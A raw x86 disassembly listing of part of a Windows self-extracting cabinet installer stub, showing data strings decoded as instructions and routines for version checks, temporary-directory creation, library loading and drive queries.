 1002594:	5f                   	pop    %edi
 1002595:	53                   	push   %ebx
 1002596:	46                   	inc    %esi
 1002597:	58                   	pop    %eax
 1002598:	5f                   	pop    %edi
 1002599:	43                   	inc    %ebx
 100259a:	41                   	inc    %ecx
 100259b:	42                   	inc    %edx
 100259c:	5f                   	pop    %edi
 100259d:	45                   	inc    %ebp
 100259e:	58                   	pop    %eax
 100259f:	45                   	inc    %ebp
 10025a0:	5f                   	pop    %edi
 10025a1:	50                   	push   %eax
 10025a2:	41                   	inc    %ecx
 10025a3:	52                   	push   %edx
 10025a4:	41                   	inc    %ecx
 10025a5:	4d                   	dec    %ebp
 10025a6:	45                   	inc    %ebp
 10025a7:	54                   	push   %esp
 10025a8:	45                   	inc    %ebp
 10025a9:	52                   	push   %edx
 10025aa:	53                   	push   %ebx
 10025ab:	00 5f 53             	add    %bl,0x53(%edi)
 10025ae:	46                   	inc    %esi
 10025af:	58                   	pop    %eax
 10025b0:	5f                   	pop    %edi
 10025b1:	43                   	inc    %ebx
 10025b2:	41                   	inc    %ecx
 10025b3:	42                   	inc    %edx
 10025b4:	5f                   	pop    %edi
 10025b5:	45                   	inc    %ebp
 10025b6:	58                   	pop    %eax
 10025b7:	45                   	inc    %ebp
 10025b8:	5f                   	pop    %edi
 10025b9:	50                   	push   %eax
 10025ba:	41                   	inc    %ecx
 10025bb:	43                   	inc    %ebx
 10025bc:	4b                   	dec    %ebx
 10025bd:	41                   	inc    %ecx
 10025be:	47                   	inc    %edi
 10025bf:	45                   	inc    %ebp
 10025c0:	00 00                	add    %al,(%eax)
 10025c2:	00 00                	add    %al,(%eax)
 10025c4:	5f                   	pop    %edi
 10025c5:	53                   	push   %ebx
 10025c6:	46                   	inc    %esi
 10025c7:	58                   	pop    %eax
 10025c8:	5f                   	pop    %edi
 10025c9:	43                   	inc    %ebx
 10025ca:	41                   	inc    %ecx
 10025cb:	42                   	inc    %edx
 10025cc:	5f                   	pop    %edi
 10025cd:	45                   	inc    %ebp
 10025ce:	58                   	pop    %eax
 10025cf:	45                   	inc    %ebp
 10025d0:	5f                   	pop    %edi
 10025d1:	50                   	push   %eax
 10025d2:	41                   	inc    %ecx
 10025d3:	54                   	push   %esp
 10025d4:	48                   	dec    %eax
 10025d5:	00 00                	add    %al,(%eax)
 10025d7:	00 68 c0             	add    %ch,-0x40(%eax)
 10025da:	00 01                	add    %al,(%ecx)
 10025dc:	b8 c0 00 01 ff       	mov    $0xff0100c0,%eax
 10025e1:	ff                   	(bad)
 10025e2:	ff                   	(bad)
 10025e3:	ff 4b 65             	decl   0x65(%ebx)
 10025e6:	00 01                	add    %al,(%ecx)
 10025e8:	5f                   	pop    %edi
 10025e9:	65 00 01             	add    %al,%gs:(%ecx)
	...
 10025f4:	01 01                	add    %eax,(%ecx)
 10025f6:	02 02                	add    (%edx),%al
 10025f8:	03 03                	add    (%ebx),%eax
 10025fa:	04 04                	add    $0x4,%al
 10025fc:	05 05 06 06 07       	add    $0x7060605,%eax
 1002601:	07                   	pop    %es
 1002602:	08 08                	or     %cl,(%eax)
 1002604:	09 09                	or     %ecx,(%ecx)
 1002606:	0a 0a                	or     (%edx),%cl
 1002608:	0b 0b                	or     (%ebx),%ecx
 100260a:	0c 0c                	or     $0xc,%al
 100260c:	0d 0d 0e 0e 0f       	or     $0xf0e0e0d,%eax
 1002611:	0f 10 10             	movups (%eax),%xmm2
 1002614:	11 11                	adc    %edx,(%ecx)
 1002616:	11 11                	adc    %edx,(%ecx)
 1002618:	11 11                	adc    %edx,(%ecx)
 100261a:	11 11                	adc    %edx,(%ecx)
 100261c:	11 11                	adc    %edx,(%ecx)
 100261e:	11 11                	adc    %edx,(%ecx)
 1002620:	11 11                	adc    %edx,(%ecx)
 1002622:	11 00                	adc    %eax,(%eax)
 1002624:	00 00                	add    %al,(%eax)
 1002626:	00 00                	add    %al,(%eax)
 1002628:	fe                   	(bad)
 1002629:	ff                   	(bad)
 100262a:	ff                   	(bad)
 100262b:	ff                   	(bad)
 100262c:	ff                   	(bad)
 100262d:	ff                   	(bad)
 100262e:	ff                   	(bad)
 100262f:	ff 00                	incl   (%eax)
 1002631:	00 00                	add    %al,(%eax)
 1002633:	00 01                	add    %al,(%ecx)
 1002635:	00 00                	add    %al,(%eax)
 1002637:	00 02                	add    %al,(%edx)
 1002639:	00 00                	add    %al,(%eax)
 100263b:	00 04 00             	add    %al,(%eax,%eax,1)
 100263e:	00 00                	add    %al,(%eax)
 1002640:	06                   	push   %es
 1002641:	00 00                	add    %al,(%eax)
 1002643:	00 0a                	add    %cl,(%edx)
 1002645:	00 00                	add    %al,(%eax)
 1002647:	00 0e                	add    %cl,(%esi)
 1002649:	00 00                	add    %al,(%eax)
 100264b:	00 16                	add    %dl,(%esi)
 100264d:	00 00                	add    %al,(%eax)
 100264f:	00 1e                	add    %bl,(%esi)
 1002651:	00 00                	add    %al,(%eax)
 1002653:	00 2e                	add    %ch,(%esi)
 1002655:	00 00                	add    %al,(%eax)
 1002657:	00 3e                	add    %bh,(%esi)
 1002659:	00 00                	add    %al,(%eax)
 100265b:	00 5e 00             	add    %bl,0x0(%esi)
 100265e:	00 00                	add    %al,(%eax)
 1002660:	7e 00                	jle    0x1002662
 1002662:	00 00                	add    %al,(%eax)
 1002664:	be 00 00 00 fe       	mov    $0xfe000000,%esi
 1002669:	00 00                	add    %al,(%eax)
 100266b:	00 7e 01             	add    %bh,0x1(%esi)
 100266e:	00 00                	add    %al,(%eax)
 1002670:	fe 01                	incb   (%ecx)
 1002672:	00 00                	add    %al,(%eax)
 1002674:	fe 02                	incb   (%edx)
 1002676:	00 00                	add    %al,(%eax)
 1002678:	fe 03                	incb   (%ebx)
 100267a:	00 00                	add    %al,(%eax)
 100267c:	fe 05 00 00 fe 07    	incb   0x7fe0000
 1002682:	00 00                	add    %al,(%eax)
 1002684:	fe 0b                	decb   (%ebx)
 1002686:	00 00                	add    %al,(%eax)
 1002688:	fe 0f                	decb   (%edi)
 100268a:	00 00                	add    %al,(%eax)
 100268c:	fe                   	(bad)
 100268d:	17                   	pop    %ss
 100268e:	00 00                	add    %al,(%eax)
 1002690:	fe                   	(bad)
 1002691:	1f                   	pop    %ds
 1002692:	00 00                	add    %al,(%eax)
 1002694:	fe                   	(bad)
 1002695:	2f                   	das
 1002696:	00 00                	add    %al,(%eax)
 1002698:	fe                   	(bad)
 1002699:	3f                   	aas
 100269a:	00 00                	add    %al,(%eax)
 100269c:	fe                   	(bad)
 100269d:	5f                   	pop    %edi
 100269e:	00 00                	add    %al,(%eax)
 10026a0:	fe                   	(bad)
 10026a1:	7f 00                	jg     0x10026a3
 10026a3:	00 fe                	add    %bh,%dh
 10026a5:	bf 00 00 fe ff       	mov    $0xfffe0000,%edi
 10026aa:	00 00                	add    %al,(%eax)
 10026ac:	fe                   	(bad)
 10026ad:	7f 01                	jg     0x10026b0
 10026af:	00 fe                	add    %bh,%dh
 10026b1:	ff 01                	incl   (%ecx)
 10026b3:	00 fe                	add    %bh,%dh
 10026b5:	ff 02                	incl   (%edx)
 10026b7:	00 fe                	add    %bh,%dh
 10026b9:	ff 03                	incl   (%ebx)
 10026bb:	00 fe                	add    %bh,%dh
 10026bd:	ff 05 00 fe ff 07    	incl   0x7fffe00
 10026c3:	00 fe                	add    %bh,%dh
 10026c5:	ff 09                	decl   (%ecx)
 10026c7:	00 fe                	add    %bh,%dh
 10026c9:	ff 0b                	decl   (%ebx)
 10026cb:	00 fe                	add    %bh,%dh
 10026cd:	ff 0d 00 fe ff 0f    	decl   0xffffe00
 10026d3:	00 fe                	add    %bh,%dh
 10026d5:	ff 11                	call   *(%ecx)
 10026d7:	00 fe                	add    %bh,%dh
 10026d9:	ff 13                	call   *(%ebx)
 10026db:	00 fe                	add    %bh,%dh
 10026dd:	ff 15 00 fe ff 17    	call   *0x17fffe00
 10026e3:	00 fe                	add    %bh,%dh
 10026e5:	ff 19                	lcall  *(%ecx)
 10026e7:	00 fe                	add    %bh,%dh
 10026e9:	ff 1b                	lcall  *(%ebx)
 10026eb:	00 fe                	add    %bh,%dh
 10026ed:	ff 1d 00 fe ff 1f    	lcall  *0x1ffffe00
 10026f3:	00 00                	add    %al,(%eax)
 10026f5:	00 00                	add    %al,(%eax)
 10026f7:	00 48 00             	add    %cl,0x0(%eax)
	...
 1002732:	00 00                	add    %al,(%eax)
 1002734:	28 c0                	sub    %al,%al
 1002736:	00 01                	add    %al,(%ecx)
 1002738:	70 27                	jo     0x1002761
 100273a:	00 01                	add    %al,(%ecx)
 100273c:	01 00                	add    %eax,(%eax)
 100273e:	00 00                	add    %al,(%eax)
 1002740:	52                   	push   %edx
 1002741:	53                   	push   %ebx
 1002742:	44                   	inc    %esp
 1002743:	53                   	push   %ebx
 1002744:	e3 5f                	jecxz  0x10027a5
 1002746:	2d cb b4 c4 2d       	sub    $0x2dc4b4cb,%eax
 100274b:	41                   	inc    %ecx
 100274c:	a2 34 9c d5 67       	mov    %al,0x67d59c34
 1002751:	b6 68                	mov    $0x68,%dh
 1002753:	c5 01                	lds    (%ecx),%eax
 1002755:	00 00                	add    %al,(%eax)
 1002757:	00 73 66             	add    %dh,0x66(%ebx)
 100275a:	78 63                	js     0x10027bf
 100275c:	61                   	popa
 100275d:	62 2e                	bound  %ebp,(%esi)
 100275f:	70 64                	jo     0x10027c5
 1002761:	62 00                	bound  %eax,(%eax)
	...
 100276f:	00 0a                	add    %cl,(%edx)
 1002771:	66 00 00             	data16 add %al,(%eax)
 1002774:	00 00                	add    %al,(%eax)
 1002776:	00 00                	add    %al,(%eax)
 1002778:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
 100277e:	8b 45 0c             	mov    0xc(%ebp),%eax
 1002781:	53                   	push   %ebx
 1002782:	33 db                	xor    %ebx,%ebx
 1002784:	85 c0                	test   %eax,%eax
 1002786:	75 07                	jne    0x100278f
 1002788:	bb 57 00 07 80       	mov    $0x80070057,%ebx
 100278d:	eb 30                	jmp    0x10027bf
 100278f:	56                   	push   %esi
 1002790:	57                   	push   %edi
 1002791:	ff 75 14             	push   0x14(%ebp)
 1002794:	8b 7d 08             	mov    0x8(%ebp),%edi
 1002797:	ff 75 10             	push   0x10(%ebp)
 100279a:	8d 70 ff             	lea    -0x1(%eax),%esi
 100279d:	56                   	push   %esi
 100279e:	57                   	push   %edi
 100279f:	ff 15 ec 21 00 01    	call   *0x10021ec
 10027a5:	83 c4 10             	add    $0x10,%esp
 10027a8:	85 c0                	test   %eax,%eax
 10027aa:	7c 08                	jl     0x10027b4
 10027ac:	3b c6                	cmp    %esi,%eax
 10027ae:	77 04                	ja     0x10027b4
 10027b0:	75 0b                	jne    0x10027bd
 10027b2:	eb 05                	jmp    0x10027b9
 10027b4:	bb 7a 00 07 80       	mov    $0x8007007a,%ebx
 10027b9:	c6 04 3e 00          	movb   $0x0,(%esi,%edi,1)
 10027bd:	5f                   	pop    %edi
 10027be:	5e                   	pop    %esi
 10027bf:	8b c3                	mov    %ebx,%eax
 10027c1:	5b                   	pop    %ebx
 10027c2:	5d                   	pop    %ebp
 10027c3:	c2 10 00             	ret    $0x10
 10027c6:	cc                   	int3
 10027c7:	cc                   	int3
 10027c8:	cc                   	int3
 10027c9:	cc                   	int3
 10027ca:	cc                   	int3
 10027cb:	8b ff                	mov    %edi,%edi
 10027cd:	55                   	push   %ebp
 10027ce:	8b ec                	mov    %esp,%ebp
 10027d0:	81 ec 98 00 00 00    	sub    $0x98,%esp
 10027d6:	a1 28 c0 00 01       	mov    0x100c028,%eax
 10027db:	89 45 fc             	mov    %eax,-0x4(%ebp)
 10027de:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
 10027e4:	50                   	push   %eax
 10027e5:	c7 85 68 ff ff ff 94 	movl   $0x94,-0x98(%ebp)
 10027ec:	00 00 00 
 10027ef:	ff 15 a0 20 00 01    	call   *0x10020a0
 10027f5:	85 c0                	test   %eax,%eax
 10027f7:	74 12                	je     0x100280b
 10027f9:	83 bd 78 ff ff ff 02 	cmpl   $0x2,-0x88(%ebp)
 1002800:	75 0e                	jne    0x1002810
 1002802:	83 bd 6c ff ff ff 05 	cmpl   $0x5,-0x94(%ebp)
 1002809:	72 05                	jb     0x1002810
 100280b:	33 c0                	xor    %eax,%eax
 100280d:	40                   	inc    %eax
 100280e:	eb 02                	jmp    0x1002812
 1002810:	33 c0                	xor    %eax,%eax
 1002812:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 1002815:	e8 e5 3a 00 00       	call   0x10062ff
 100281a:	c9                   	leave
 100281b:	c3                   	ret
 100281c:	cc                   	int3
 100281d:	cc                   	int3
 100281e:	cc                   	int3
 100281f:	cc                   	int3
 1002820:	cc                   	int3
 1002821:	8b ff                	mov    %edi,%edi
 1002823:	55                   	push   %ebp
 1002824:	8b ec                	mov    %esp,%ebp
 1002826:	51                   	push   %ecx
 1002827:	a1 20 c0 00 01       	mov    0x100c020,%eax
 100282c:	83 f8 ff             	cmp    $0xffffffff,%eax
 100282f:	0f 84 9d 00 00 00    	je     0x10028d2
 1002835:	53                   	push   %ebx
 1002836:	56                   	push   %esi
 1002837:	33 db                	xor    %ebx,%ebx
 1002839:	53                   	push   %ebx
 100283a:	53                   	push   %ebx
 100283b:	53                   	push   %ebx
 100283c:	50                   	push   %eax
 100283d:	ff 15 a8 20 00 01    	call   *0x10020a8
 1002843:	53                   	push   %ebx
 1002844:	8d 45 fc             	lea    -0x4(%ebp),%eax
 1002847:	50                   	push   %eax
 1002848:	be 14 03 00 00       	mov    $0x314,%esi
 100284d:	56                   	push   %esi
 100284e:	68 c0 c8 00 01       	push   $0x100c8c0
 1002853:	ff 35 20 c0 00 01    	push   0x100c020
 1002859:	ff 15 a4 20 00 01    	call   *0x10020a4
 100285f:	85 c0                	test   %eax,%eax
 1002861:	74 66                	je     0x10028c9
 1002863:	39 75 fc             	cmp    %esi,-0x4(%ebp)
 1002866:	75 61                	jne    0x10028c9
 1002868:	81 3d c0 c8 00 01 53 	cmpl   $0x6e776453,0x100c8c0
 100286f:	64 77 6e 
 1002872:	75 55                	jne    0x10028c9
 1002874:	f6 05 cb c8 00 01 80 	testb  $0x80,0x100c8cb
 100287b:	75 53                	jne    0x10028d0
 100287d:	80 0d cb c8 00 01 40 	orb    $0x40,0x100c8cb
 1002884:	68 d0 ca 00 01       	push   $0x100cad0
 1002889:	68 03 01 00 00       	push   $0x103
 100288e:	68 00 cd 00 01       	push   $0x100cd00
 1002893:	88 1d cf ca 00 01    	mov    %bl,0x100cacf
 1002899:	88 1d d3 cb 00 01    	mov    %bl,0x100cbd3
 100289f:	ff 15 dc 21 00 01    	call   *0x10021dc
 10028a5:	83 c4 0c             	add    $0xc,%esp
 10028a8:	81 3d c4 c8 00 01 00 	cmpl   $0x10000,0x100c8c4
 10028af:	00 01 00 
 10028b2:	75 1c                	jne    0x10028d0
 10028b4:	f7 05 c8 c8 00 01 ec 	testl  $0x3fffffec,0x100c8c8
 10028bb:	ff ff 3f 
 10028be:	75 10                	jne    0x10028d0
 10028c0:	80 25 cb c8 00 01 bf 	andb   $0xbf,0x100c8cb
 10028c7:	eb 07                	jmp    0x10028d0
 10028c9:	80 0d cb c8 00 01 80 	orb    $0x80,0x100c8cb
 10028d0:	5e                   	pop    %esi
 10028d1:	5b                   	pop    %ebx
 10028d2:	c9                   	leave
 10028d3:	c3                   	ret
 10028d4:	cc                   	int3
 10028d5:	cc                   	int3
 10028d6:	cc                   	int3
 10028d7:	cc                   	int3
 10028d8:	cc                   	int3
 10028d9:	8b ff                	mov    %edi,%edi
 10028db:	55                   	push   %ebp
 10028dc:	8b ec                	mov    %esp,%ebp
 10028de:	81 ec 14 01 00 00    	sub    $0x114,%esp
 10028e4:	a1 28 c0 00 01       	mov    0x100c028,%eax
 10028e9:	83 a5 f0 fe ff ff 00 	andl   $0x0,-0x110(%ebp)
 10028f0:	53                   	push   %ebx
 10028f1:	56                   	push   %esi
 10028f2:	8b 35 c0 20 00 01    	mov    0x10020c0,%esi
 10028f8:	57                   	push   %edi
 10028f9:	8b 7d 08             	mov    0x8(%ebp),%edi
 10028fc:	6a 00                	push   $0x0
 10028fe:	89 45 fc             	mov    %eax,-0x4(%ebp)
 1002901:	ff d6                	call   *%esi
 1002903:	89 85 ec fe ff ff    	mov    %eax,-0x114(%ebp)
 1002909:	83 c8 01             	or     $0x1,%eax
 100290c:	50                   	push   %eax
 100290d:	ff d6                	call   *%esi
 100290f:	ff 15 bc 20 00 01    	call   *0x10020bc
 1002915:	83 a5 f4 fe ff ff 00 	andl   $0x0,-0x10c(%ebp)
 100291c:	8b d8                	mov    %eax,%ebx
 100291e:	33 d2                	xor    %edx,%edx
 1002920:	b9 40 42 0f 00       	mov    $0xf4240,%ecx
 1002925:	8b c3                	mov    %ebx,%eax
 1002927:	f7 f1                	div    %ecx
 1002929:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
 100292f:	52                   	push   %edx
 1002930:	57                   	push   %edi
 1002931:	68 4c 22 00 01       	push   $0x100224c
 1002936:	50                   	push   %eax
 1002937:	ff 15 e0 21 00 01    	call   *0x10021e0
 100293d:	83 c4 10             	add    $0x10,%esp
 1002940:	6a 00                	push   $0x0
 1002942:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
 1002948:	50                   	push   %eax
 1002949:	43                   	inc    %ebx
 100294a:	ff 15 b8 20 00 01    	call   *0x10020b8
 1002950:	85 c0                	test   %eax,%eax
 1002952:	75 21                	jne    0x1002975
 1002954:	ff 15 b4 20 00 01    	call   *0x10020b4
 100295a:	3d b7 00 00 00       	cmp    $0xb7,%eax
 100295f:	75 3f                	jne    0x10029a0
 1002961:	ff 85 f4 fe ff ff    	incl   -0x10c(%ebp)
 1002967:	81 bd f4 fe ff ff e8 	cmpl   $0x3e8,-0x10c(%ebp)
 100296e:	03 00 00 
 1002971:	7c ab                	jl     0x100291e
 1002973:	eb 2b                	jmp    0x10029a0
 1002975:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
 100297b:	50                   	push   %eax
 100297c:	ff 15 b0 20 00 01    	call   *0x10020b0
 1002982:	85 c0                	test   %eax,%eax
 1002984:	75 10                	jne    0x1002996
 1002986:	6a 04                	push   $0x4
 1002988:	50                   	push   %eax
 1002989:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
 100298f:	50                   	push   %eax
 1002990:	ff 15 ac 20 00 01    	call   *0x10020ac
 1002996:	c7 85 f0 fe ff ff 01 	movl   $0x1,-0x110(%ebp)
 100299d:	00 00 00 
 10029a0:	ff b5 ec fe ff ff    	push   -0x114(%ebp)
 10029a6:	ff d6                	call   *%esi
 10029a8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 10029ab:	8b 85 f0 fe ff ff    	mov    -0x110(%ebp),%eax
 10029b1:	5f                   	pop    %edi
 10029b2:	5e                   	pop    %esi
 10029b3:	5b                   	pop    %ebx
 10029b4:	e8 46 39 00 00       	call   0x10062ff
 10029b9:	c9                   	leave
 10029ba:	c2 04 00             	ret    $0x4
 10029bd:	cc                   	int3
 10029be:	cc                   	int3
 10029bf:	cc                   	int3
 10029c0:	cc                   	int3
 10029c1:	cc                   	int3
 10029c2:	8b ff                	mov    %edi,%edi
 10029c4:	55                   	push   %ebp
 10029c5:	8b ec                	mov    %esp,%ebp
 10029c7:	81 ec 2c 0c 00 00    	sub    $0xc2c,%esp
 10029cd:	a1 28 c0 00 01       	mov    0x100c028,%eax
 10029d2:	89 45 fc             	mov    %eax,-0x4(%ebp)
 10029d5:	68 08 02 00 00       	push   $0x208
 10029da:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
 10029e0:	50                   	push   %eax
 10029e1:	c6 85 f3 f3 ff ff 00 	movb   $0x0,-0xc0d(%ebp)
 10029e8:	c7 85 e4 f3 ff ff 00 	movl   $0x100,-0xc1c(%ebp)
 10029ef:	01 00 00 
 10029f2:	c7 85 d8 f3 ff ff 00 	movl   $0x400,-0xc28(%ebp)
 10029f9:	04 00 00 
 10029fc:	ff 15 d0 20 00 01    	call   *0x10020d0
 1002a02:	85 c0                	test   %eax,%eax
 1002a04:	0f 84 f4 00 00 00    	je     0x1002afe
 1002a0a:	57                   	push   %edi
 1002a0b:	8d bd f4 fd ff ff    	lea    -0x20c(%ebp),%edi
 1002a11:	4f                   	dec    %edi
 1002a12:	8a 47 01             	mov    0x1(%edi),%al
 1002a15:	47                   	inc    %edi
 1002a16:	84 c0                	test   %al,%al
 1002a18:	75 f8                	jne    0x1002a12
 1002a1a:	56                   	push   %esi
 1002a1b:	be a4 22 00 01       	mov    $0x10022a4,%esi
 1002a20:	a5                   	movsl  %ds:(%esi),%es:(%edi)
 1002a21:	a5                   	movsl  %ds:(%esi),%es:(%edi)
 1002a22:	a5                   	movsl  %ds:(%esi),%es:(%edi)
 1002a23:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
 1002a29:	50                   	push   %eax
 1002a2a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
 1002a2b:	ff 15 cc 20 00 01    	call   *0x10020cc
 1002a31:	8b f8                	mov    %eax,%edi
 1002a33:	85 ff                	test   %edi,%edi
 1002a35:	0f 84 c1 00 00 00    	je     0x1002afc
 1002a3b:	8b 35 c8 20 00 01    	mov    0x10020c8,%esi
 1002a41:	68 98 22 00 01       	push   $0x1002298
 1002a46:	57                   	push   %edi
 1002a47:	ff d6                	call   *%esi
 1002a49:	85 c0                	test   %eax,%eax
 1002a4b:	89 85 e0 f3 ff ff    	mov    %eax,-0xc20(%ebp)
 1002a51:	0f 84 9e 00 00 00    	je     0x1002af5
 1002a57:	68 88 22 00 01       	push   $0x1002288
 1002a5c:	57                   	push   %edi
 1002a5d:	ff d6                	call   *%esi
 1002a5f:	85 c0                	test   %eax,%eax
 1002a61:	89 85 dc f3 ff ff    	mov    %eax,-0xc24(%ebp)
 1002a67:	0f 84 88 00 00 00    	je     0x1002af5
 1002a6d:	53                   	push   %ebx
 1002a6e:	68 74 22 00 01       	push   $0x1002274
 1002a73:	57                   	push   %edi
 1002a74:	ff d6                	call   *%esi
 1002a76:	8b d8                	mov    %eax,%ebx
 1002a78:	85 db                	test   %ebx,%ebx
 1002a7a:	74 78                	je     0x1002af4
 1002a7c:	68 58 22 00 01       	push   $0x1002258
 1002a81:	57                   	push   %edi
 1002a82:	ff d6                	call   *%esi
 1002a84:	85 c0                	test   %eax,%eax
 1002a86:	89 85 ec f3 ff ff    	mov    %eax,-0xc14(%ebp)
 1002a8c:	74 66                	je     0x1002af4
 1002a8e:	8d 85 e8 f3 ff ff    	lea    -0xc18(%ebp),%eax
 1002a94:	50                   	push   %eax
 1002a95:	6a 00                	push   $0x0
 1002a97:	ff d3                	call   *%ebx
 1002a99:	85 c0                	test   %eax,%eax
 1002a9b:	75 57                	jne    0x1002af4
 1002a9d:	83 bd e8 f3 ff ff 13 	cmpl   $0x13,-0xc18(%ebp)
 1002aa4:	75 4e                	jne    0x1002af4
 1002aa6:	50                   	push   %eax
 1002aa7:	ff 95 e0 f3 ff ff    	call   *-0xc20(%ebp)
 1002aad:	8b f0                	mov    %eax,%esi
 1002aaf:	85 f6                	test   %esi,%esi
 1002ab1:	74 41                	je     0x1002af4
 1002ab3:	8d 85 d4 f3 ff ff    	lea    -0xc2c(%ebp),%eax
 1002ab9:	50                   	push   %eax
 1002aba:	8d 85 d8 f3 ff ff    	lea    -0xc28(%ebp),%eax
 1002ac0:	50                   	push   %eax
 1002ac1:	8d 85 f4 f3 ff ff    	lea    -0xc0c(%ebp),%eax
 1002ac7:	50                   	push   %eax
 1002ac8:	8d 85 e4 f3 ff ff    	lea    -0xc1c(%ebp),%eax
 1002ace:	50                   	push   %eax
 1002acf:	8d 85 f4 fb ff ff    	lea    -0x40c(%ebp),%eax
 1002ad5:	50                   	push   %eax
 1002ad6:	56                   	push   %esi
 1002ad7:	ff 95 ec f3 ff ff    	call   *-0xc14(%ebp)
 1002add:	85 c0                	test   %eax,%eax
 1002adf:	75 0c                	jne    0x1002aed
 1002ae1:	8a 85 f4 f3 ff ff    	mov    -0xc0c(%ebp),%al
 1002ae7:	88 85 f3 f3 ff ff    	mov    %al,-0xc0d(%ebp)
 1002aed:	56                   	push   %esi
 1002aee:	ff 95 dc f3 ff ff    	call   *-0xc24(%ebp)
 1002af4:	5b                   	pop    %ebx
 1002af5:	57                   	push   %edi
 1002af6:	ff 15 c4 20 00 01    	call   *0x10020c4
 1002afc:	5e                   	pop    %esi
 1002afd:	5f                   	pop    %edi
 1002afe:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 1002b01:	8a 85 f3 f3 ff ff    	mov    -0xc0d(%ebp),%al
 1002b07:	e8 f3 37 00 00       	call   0x10062ff
 1002b0c:	c9                   	leave
 1002b0d:	c3                   	ret
 1002b0e:	cc                   	int3
 1002b0f:	cc                   	int3
 1002b10:	cc                   	int3
 1002b11:	cc                   	int3
 1002b12:	cc                   	int3
 1002b13:	8b ff                	mov    %edi,%edi
 1002b15:	55                   	push   %ebp
 1002b16:	8b ec                	mov    %esp,%ebp
 1002b18:	83 ec 2c             	sub    $0x2c,%esp
 1002b1b:	a1 28 c0 00 01       	mov    0x100c028,%eax
 1002b20:	53                   	push   %ebx
 1002b21:	8a 5d 08             	mov    0x8(%ebp),%bl
 1002b24:	56                   	push   %esi
 1002b25:	57                   	push   %edi
 1002b26:	be b4 22 00 01       	mov    $0x10022b4,%esi
 1002b2b:	8d 7d f4             	lea    -0xc(%ebp),%edi
 1002b2e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
 1002b2f:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
 1002b31:	89 45 fc             	mov    %eax,-0x4(%ebp)
 1002b34:	8d 45 f0             	lea    -0x10(%ebp),%eax
 1002b37:	c7 45 f0 3f 3a 5c 00 	movl   $0x5c3a3f,-0x10(%ebp)
 1002b3e:	50                   	push   %eax
 1002b3f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
 1002b40:	88 5d f0             	mov    %bl,-0x10(%ebp)
 1002b43:	ff 15 e0 20 00 01    	call   *0x10020e0
 1002b49:	8b f8                	mov    %eax,%edi
 1002b4b:	48                   	dec    %eax
 1002b4c:	48                   	dec    %eax
 1002b4d:	74 11                	je     0x1002b60
 1002b4f:	48                   	dec    %eax
 1002b50:	74 5c                	je     0x1002bae
 1002b52:	83 e8 03             	sub    $0x3,%eax
 1002b55:	74 04                	je     0x1002b5b
 1002b57:	33 ff                	xor    %edi,%edi
 1002b59:	eb 53                	jmp    0x1002bae
 1002b5b:	6a 03                	push   $0x3
 1002b5d:	5f                   	pop    %edi
 1002b5e:	eb 4e                	jmp    0x1002bae
 1002b60:	33 f6                	xor    %esi,%esi
 1002b62:	56                   	push   %esi
 1002b63:	56                   	push   %esi
 1002b64:	6a 03                	push   $0x3
 1002b66:	56                   	push   %esi
 1002b67:	6a 03                	push   $0x3
 1002b69:	68 00 00 00 80       	push   $0x80000000
 1002b6e:	8d 45 f4             	lea    -0xc(%ebp),%eax
 1002b71:	50                   	push   %eax
 1002b72:	88 5d f8             	mov    %bl,-0x8(%ebp)
 1002b75:	ff 15 dc 20 00 01    	call   *0x10020dc
 1002b7b:	8b d8                	mov    %eax,%ebx
 1002b7d:	83 fb ff             	cmp    $0xffffffff,%ebx
 1002b80:	74 d5                	je     0x1002b57
 1002b82:	56                   	push   %esi
 1002b83:	8d 45 ec             	lea    -0x14(%ebp),%eax
 1002b86:	50                   	push   %eax
 1002b87:	6a 18                	push   $0x18
 1002b89:	8d 45 d4             	lea    -0x2c(%ebp),%eax
 1002b8c:	50                   	push   %eax
 1002b8d:	56                   	push   %esi
 1002b8e:	56                   	push   %esi
 1002b8f:	68 00 00 07 00       	push   $0x70000
 1002b94:	53                   	push   %ebx
 1002b95:	ff 15 d8 20 00 01    	call   *0x10020d8
 1002b9b:	85 c0                	test   %eax,%eax
 1002b9d:	74 06                	je     0x1002ba5
 1002b9f:	83 7d dc 0b          	cmpl   $0xb,-0x24(%ebp)
 1002ba3:	74 02                	je     0x1002ba7
 1002ba5:	33 ff                	xor    %edi,%edi
 1002ba7:	53                   	push   %ebx
 1002ba8:	ff 15 d4 20 00 01    	call   *0x10020d4
 1002bae:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 1002bb1:	8b c7                	mov    %edi,%eax
 1002bb3:	5f                   	pop    %edi
 1002bb4:	5e                   	pop    %esi
 1002bb5:	5b                   	pop    %ebx
 1002bb6:	e8 44 37 00 00       	call   0x10062ff
 1002bbb:	c9                   	leave
 1002bbc:	c2 04 00             	ret    $0x4
 1002bbf:	cc                   	int3
 1002bc0:	cc                   	int3
 1002bc1:	cc                   	int3
 1002bc2:	cc                   	int3
 1002bc3:	cc                   	int3
 1002bc4:	8b ff                	mov    %edi,%edi
 1002bc6:	55                   	push   %ebp
 1002bc7:	8b ec                	mov    %esp,%ebp
 1002bc9:	53                   	push   %ebx
 1002bca:	56                   	push   %esi
 1002bcb:	8b 75 08             	mov    0x8(%ebp),%esi
 1002bce:	8b c6                	mov    %esi,%eax
 1002bd0:	57                   	push   %edi
 1002bd1:	8d 48 01             	lea    0x1(%eax),%ecx
 1002bd4:	8a 10                	mov    (%eax),%dl
 1002bd6:	40                   	inc    %eax
 1002bd7:	84 d2                	test   %dl,%dl
 1002bd9:	75 f9                	jne    0x1002bd4
 1002bdb:	8b 7d 10             	mov    0x10(%ebp),%edi
 1002bde:	2b c1                	sub    %ecx,%eax
 1002be0:	8b c8                	mov    %eax,%ecx
 1002be2:	c1 e9 02             	shr    $0x2,%ecx
 1002be5:	8d 14 38             	lea    (%eax,%edi,1),%edx
